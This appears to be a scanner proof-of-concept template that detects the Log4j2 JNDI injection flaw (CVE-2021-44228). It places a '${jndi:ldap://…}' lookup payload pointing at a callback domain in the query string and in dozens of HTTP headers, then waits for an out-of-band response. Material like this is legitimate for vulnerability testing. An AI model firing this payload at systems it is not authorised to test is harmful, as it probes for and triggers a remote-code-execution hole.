name: Apache_Log4j2_JNDI_RCE_vulnerability_HTTP_header_fuzz_CVE_2021_44228
transport: http
detail:
  dock: app="Log4j2"||header="Apache-Coyote" || header = "JSESSIONID" || header="Apache
    Tomcat" || header="Jetty"
  product: Log4j2
  homepage: https://logging.apache.org/log4j/2.x/
  impact: <p>Attackers can use the vulnerability CVE-2021-44228 to cause remote code
    execution and control server permissions.</p>
  description: <p>Apache Log4j2 is a Java-based logging tool. This tool rewrites the
    Log4j framework and introduces a lot of rich features. The log framework is widely
    used in business system development to record log information.</p><p>Apache Log4j
    2.x < 2.16.0-rc1 has jndi injection vulnerability. In most cases, developers may
    write error messages caused by user input into the log. Attackers can use this
    feature to construct special data request packets through this vulnerability,
    and ultimately trigger remote code execution.(This poc detects this vulnerability
    by fuzzing HTTP headers.)</p>
set:
  reverse: newReverse()
  payload: '${jndi:ldap://' + reverse.domain + '}'
rules:
  r1:
    method: GET
    path: /?id={{payload}}
    follow_redirects: true
    headers:
      X-Api-Version: '{{payload}}'
      X-Forwarded-For: '{{payload}}'
      If-Modified-Since: '{{payload}}'
      User-Agent: '{{payload}}'
      Cookie: '{{payload}}'
      Refer: '{{payload}}'
      Accept-Language: '{{payload}}'
      Accept-Encoding: '{{payload}}'
      Upgrade-insecure-requests: '{{payload}}'
      Accept: '{{payload}}'
      upgrade-insecure-requests: '{{payload}}'
      Origin: '{{payload}}'
      Pragma: '{{payload}}'
      X-Requested-With: '{{payload}}'
      X-CSRF-Token: '{{payload}}'
      Dnt: '{{payload}}'
      Content-Length: '{{payload}}'
      Access-Control-Request-Method: '{{payload}}'
      Access-Control-Request-Method: '{{payload}}'
      Warning: '{{payload}}'
      Authorization: '{{payload}}'
      TE: '{{payload}}'
      Accept-Charset: '{{payload}}'
      Accept-Datetime: '{{payload}}'
      Date: '{{payload}}'
      Forwarded: '{{payload}}'
      From: '{{payload}}'
      Max-Forwards: '{{payload}}'
      Proxy-Authorization: '{{payload}}'
      Range: '{{payload}}'
      Content-Disposition: '{{payload}}'
      Content-Encoding: '{{payload}}'
      X-Amz-Target: '{{payload}}'
      X-Amz-Date: '{{payload}}'
      Username: '{{payload}}'
      IP: '{{payload}}'
      IPaddress: '{{payload}}'
      Hostname: '{{payload}}'
      X-CSRFToken: '{{payload}}'
      X-XSRF-TOKEN: '{{payload}}'
      X-ProxyUser-Ip: '{{payload}}'
    expression: reverse.wait(5)
expression: r1()
